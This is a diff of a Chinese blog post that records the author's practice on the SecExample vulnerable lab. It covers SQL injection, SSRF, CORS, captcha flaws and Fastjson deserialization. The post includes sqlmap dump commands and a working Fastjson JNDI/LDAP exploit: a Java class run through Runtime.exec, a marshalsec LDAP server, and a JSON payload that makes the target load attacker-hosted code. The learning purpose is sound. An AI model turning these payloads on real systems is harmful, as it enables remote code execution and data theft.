@@ -1,19 +1,39 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="SQL注入                           RCE        映射 &#x2F;rce 的 GET 请求到 input 方法 public String input() 方法返回视图名称 &quot;rce&#x2F;rce&quot;，渲染 rce&#x2F;rce 页面  从请求参数中获取名为 command 的值 检查 command 是否为 null 或空">
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="SQL注入        UserMapper.java代码中使用了 @Mapper 和 @Repository 注解，这通常用于 MyBatis 的 Mapper 接口 使用了 MyBatis 框架，它通过 XML 配置文件或注解来定义 SQL 查询。这些查询语句可能存在于 MyBatis 的 XML 配置文件中，或者是通过注解方式定义的 检查 MyBat">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hexo">
+<meta property="og:title" content="SecExample-学习">
 <meta property="og:url" content="http://example.com/2024/05/28/SecExample/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="SQL注入                           RCE        映射 &#x2F;rce 的 GET 请求到 input 方法 public String input() 方法返回视图名称 &quot;rce&#x2F;rce&quot;，渲染 rce&#x2F;rce 页面  从请求参数中获取名为 command 的值 检查 command 是否为 null 或空">
+<meta property="og:description" content="SQL注入        UserMapper.java代码中使用了 @Mapper 和 @Repository 注解，这通常用于 MyBatis 的 Mapper 接口 使用了 MyBatis 框架，它通过 XML 配置文件或注解来定义 SQL 查询。这些查询语句可能存在于 MyBatis 的 XML 配置文件中，或者是通过注解方式定义的 检查 MyBat">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405300944877.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405300934056.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405300954169.png">
 <meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281403684.png">
 <meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281404456.png">
 <meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281517734.png">
 <meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281619851.png">
-<meta property="article:published_time" content="2024-05-28T09:27:30.400Z">
-<meta property="article:modified_time" content="2024-05-28T09:27:30.542Z">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405290942265.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405290948049.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291020680.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291029949.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291633945.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291634212.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311544536.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311554700.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311555719.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311556646.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292141031.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292141142.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292142029.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292144331.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292145052.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292145841.png">
+<meta property="article:published_time" content="2024-05-28T05:26:33.000Z">
+<meta property="article:modified_time" content="2024-05-31T08:08:48.066Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="SecExample靶场练习">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281403684.png"><title>[ Untitled ] | Hexo</title><link ref="canonical" href="http://example.com/2024/05/28/SecExample/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405300944877.png"><title>SecExample-学习 | Hexo</title><link ref="canonical" href="http://example.com/2024/05/28/SecExample/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
 var CONFIG = {
   root: '/',
   algolia: undefined,
@@ -37,10 +57,29 @@ var CONFIG = {
   sourcePath: {"js":"js","css":"css","images":"images"},
 };
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">[ Untitled ]</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-28</span></span></div></header><div class="post-body">
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">SecExample-学习</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-31</span></span></div></header><div class="post-body">
         <h1 id="SQL注入"   >
           <a href="#SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1>
-      
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405300944877.png" alt="image-20240530094448840"></p>
+<p>UserMapper.java代码中使用了 <code>@Mapper</code> 和 <code>@Repository</code> 注解，这通常用于 MyBatis 的 Mapper 接口</p>
+<p>使用了 MyBatis 框架，它通过 XML 配置文件或注解来定义 SQL 查询。这些查询语句可能存在于 MyBatis 的 XML 配置文件中，或者是通过注解方式定义的</p>
+<p>检查 MyBatis 的 XML 配置文件或注解，找到 <code>UserMapper</code> 接口中 <code>listUser</code> 和 <code>listUserByName</code> 方法的具体实现</p>
+<p>在UserMapper.xml中</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405300934056.png" alt="image-20240530093431953"></p>
+<p>在 <code>listUserByName</code> 查询中，使用了 <code>$&#123;name&#125;</code> 来拼接 SQL 语句。<code>$&#123;&#125;</code> 是 MyBatis 的一种字符串替换方式，直接将用户输入的值插入到 SQL 查询中，这种方式容易导致 SQL 注入漏洞，如果用户输入了恶意的 SQL 代码，可能会破坏数据库或窃取数据</p>
+<p>为了防止 SQL 注入漏洞，应使用 MyBatis 提供的 <code>#&#123;&#125;</code> 参数化查询方式。这种方式会使用预编译语句，确保用户输入不会直接作为 SQL 代码执行</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405300954169.png" alt="image-20240530095433112"></p>
+<p>使用sqlmap</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/sql/?name=1&quot; --dbs</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/sql/?name=1&quot; -D mybatis --tables</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/sql/?name=1&quot; -D mybatis -T user --columns</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/sql/?name=1&quot; -D mybatis -T user -C name,id,pwd --dump</span><br></pre></td></tr></table></div></figure>
+
+<p>好像注入出来的信息和本身的界面一样…</p>
+
         <h1 id="RCE"   >
           <a href="#RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281403684.png" alt="image-20240528140353654"></p>
@@ -56,7 +95,9 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
 
         <h1 id="spel表达式注入"   >
           <a href="#spel表达式注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#spel表达式注入" class="headerlink" title="spel表达式注入"></a>spel表达式注入</h1>
-      
+      <p>SpEL表达式注入是一种攻击方式，攻击者通过恶意输入在应用程序中执行任意的 SpEL 表达式，从而实现未授权的操作</p>
+<p>SpEL 是 Spring Framework 提供的一种表达式语言，通常用于在 Spring 配置文件、注解和其他地方进行表达式计算</p>
+
         <h1 id="XSS"   >
           <a href="#XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281517734.png" alt="image-20240528151727685"></p>
@@ -69,9 +110,124 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
           <a href="#CSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281619851.png" alt="image-20240528161919791"></p>
 <p>从请求中获取 <code>User</code> 对象 <code>user1</code> 并设置到类成员变量 <code>user</code> 中，使用 <code>userService.addUser(user)</code> 将用户添加到服务中</p>
-</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://example.com">John Doe</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://example.com/2024/05/28/SecExample/">http://example.com/2024/05/28/SecExample/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2024/05/23/pikachu%E9%9D%B6%E5%9C%BA/"><span class="paginator-prev__text">pikachu-学习</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">
+
+        <h1 id="SSRF"   >
+          <a href="#SSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405290942265.png" alt="image-20240529094223191"></p>
+<p>处理 POST 请求，接受一个 URL 参数，并通过 <code>HttpTool.getHttpReuest</code> 获取该 URL 的内容，然后将结果添加到模型中，返回视图 <code>ssrf/ssrfoutput</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405290948049.png" alt="image-20240529094806007"></p>
+<p><code>httpRequest(String requestUrl)</code>：接受一个 URL 参数，打开该 URL 的连接，读取内容并返回</p>
+<p><code>getHttpReuest(String requestUrl)</code>：调用 <code>httpRequest</code> 方法，简化调用流程</p>
+<p>由于应用程序从用户输入获取 URL 并直接在服务器上发起请求，而没有进行任何验证或过滤，所以用户可以通过服务器代理访问任意资源</p>
+
+        <h1 id="CORS"   >
+          <a href="#CORS" class="heading-link"><i class="fas fa-link"></i></a><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291020680.png" alt="image-20240529102023649"></p>
+<p>使用 <code>@CrossOrigin</code> 注解配置跨域访问，允许来自任何域的请求，这是 Spring 的一种声明式配置方式</p>
+<p>将敏感信息添加到模型中，并返回视图名 <code>cors/cors</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291029949.png" alt="image-20240529102922909"></p>
+<p>在响应头中设置 <code>Access-Control-Allow-Origin</code>，允许来自任何域的跨域请求，它允许任意网站读取该资源，将敏感信息添加到模型中，直接设置响应头，这是一个编程式配置方式，需要在每个方法中显式设置响应头</p>
+<p>在模型中添加了敏感信息 <code>info</code>，如果没有适当的访问控制措施，可能导致敏感信息泄露。</p>
+<p>并且这两个都设置了都会返回 <code>Access-Control-Allow-Origin: *</code>，意味着允许任何来源的跨域请求</p>
+
+        <h1 id="Fastjson反序列化"   >
+          <a href="#Fastjson反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#Fastjson反序列化" class="headerlink" title="Fastjson反序列化"></a>Fastjson反序列化</h1>
+      
+        <h3 id="代码分析"   >
+          <a href="#代码分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291633945.png" alt="image-20240529163300842"></p>
+<p><code>JSON.parseObject(jsonData)</code>：使用 FastJSON 库解析 JSON 数据</p>
+<p>设置 <code>User</code> 对象的属性 <code>age</code> 和 <code>username</code></p>
+<p>将 <code>User</code> 对象添加到模型中，供视图使用</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291634212.png" alt="image-20240529163444175"></p>
+<p>将 <code>User</code> 对象添加到模型中</p>
+
+        <h3 id="漏洞复现"   >
+          <a href="#漏洞复现" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3>
+      <p>首先修改dockerfile文件第一行为</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FROM openjdk:8u111-jdk-alpine</span><br></pre></td></tr></table></div></figure>
+
+<p>改之前这个docker的java版本是8u212</p>
+
+        <h6 id="JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK-8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效"   >
+          <a href="#JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK-8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效" class="heading-link"><i class="fas fa-link"></i></a><a href="#JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK-8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效" class="headerlink" title="JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK 8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效"></a>JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK 8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效</h6>
+      <p>改了之后才能进行攻击</p>
+
+        <h5 id="编译并上传命令执行代码"   >
+          <a href="#编译并上传命令执行代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#编译并上传命令执行代码" class="headerlink" title="编译并上传命令执行代码"></a>编译并上传命令执行代码</h5>
+      <p>新建一个Touch.java文件，写入</p>
+<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Touch</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/Touch&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>然后在该文件目录下打开终端，编译，运行</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Touch.java</span><br></pre></td></tr></table></div></figure>
+
+<p>此时该目录下会生成一个Touch.class文件</p>
+
+        <h5 id="启动http服务"   >
+          <a href="#启动http服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#启动http服务" class="headerlink" title="启动http服务"></a>启动http服务</h5>
+      <p>打开终端，运行</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 4444   //端口号只要不被其他应用占用就行</span><br></pre></td></tr></table></div></figure>
+
+
+        <h5 id="启动LDAP服务器"   >
+          <a href="#启动LDAP服务器" class="heading-link"><i class="fas fa-link"></i></a><a href="#启动LDAP服务器" class="headerlink" title="启动LDAP服务器"></a>启动LDAP服务器</h5>
+      <p>在E:\Github\marshalsec-master\target目录下打开终端，运行</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://主机ip地址:4444/#Touch&quot;</span></span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311544536.png" alt="image-20240531154409456"></p>
+
+        <h5 id="发包"   >
+          <a href="#发包" class="heading-link"><i class="fas fa-link"></i></a><a href="#发包" class="headerlink" title="发包"></a>发包</h5>
+      <p>抓包后修改为</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /fastjson HTTP/1.1</span><br><span class="line">Host: 本机ip:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;(Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;100&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://本机ip:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 189</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   &quot;axin&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">      &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &quot;is&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">      &quot;dataSourceName&quot;:&quot;ldap://本机ip:1389/Touch&quot;,</span><br><span class="line">      &quot;autoCommit&quot;:true</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>发送后会显示</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311554700.png" alt="image-20240531155441657"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311555719.png" alt="image-20240531155505690"></p>
+<p>查看docker文件</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311556646.png" alt="image-20240531155609569"></p>
+
+        <h1 id="验证码相关漏洞"   >
+          <a href="#验证码相关漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#验证码相关漏洞" class="headerlink" title="验证码相关漏洞"></a>验证码相关漏洞</h1>
+      
+        <h3 id="代码分析-1"   >
+          <a href="#代码分析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292141031.png" alt="image-20240529214056931"></p>
+<p>成员变量 <code>Code</code> 用于存储生成的验证码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292141142.png" alt="image-20240529214151097"></p>
+<p>创建一个 <code>Random</code> 对象生成一个随机数 <code>number</code>，范围在 <code>0</code> 到 <code>899999</code> 之间</p>
+<p>将生成的验证码 <code>number</code> 添加到模型中，键为 <code>code</code></p>
+<p>将生成的验证码打印到控制台</p>
+<p>将成员变量 <code>Code</code> 设置为生成的验证码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292142029.png" alt="image-20240529214237991"></p>
+<p>初始化结果字符串 <code>result</code> 为 <code>&quot;fail&quot;</code></p>
+<p>检查 <code>code1</code> 是否不为空且不为 <code>0</code>，并且是否与生成的验证码 <code>Code</code> 相等，如果验证通过，打印 <code>true</code> 到控制台，并将 <code>result</code> 设置为 <code>&quot;sueecss&quot;</code>（拼写错了）</p>
+<p>将结果字符串 <code>result</code> 添加到模型中，键为 <code>code1</code></p>
+
+        <h3 id="漏洞复现-1"   >
+          <a href="#漏洞复现-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292144331.png" alt="image-20240529214414283"></p>
+<p>获取验证码</p>
+<p>在这里可以找到生成的随机数，即验证码（直接查看网页源代码也有）</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292145052.png" alt="image-20240529214501002"></p>
+<p>输入登录后，返回sueecss</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292145841.png" alt="image-20240529214532798"></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://example.com">John Doe</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://example.com/2024/05/28/SecExample/">http://example.com/2024/05/28/SecExample/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/SecExample%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">SecExample靶场练习</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2024/05/30/WebBug%E9%9D%B6%E5%9C%BA/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">WebBug-学习</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2024/05/23/pikachu%E9%9D%B6%E5%9C%BA/"><span class="paginator-prev__text">pikachu-学习</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">
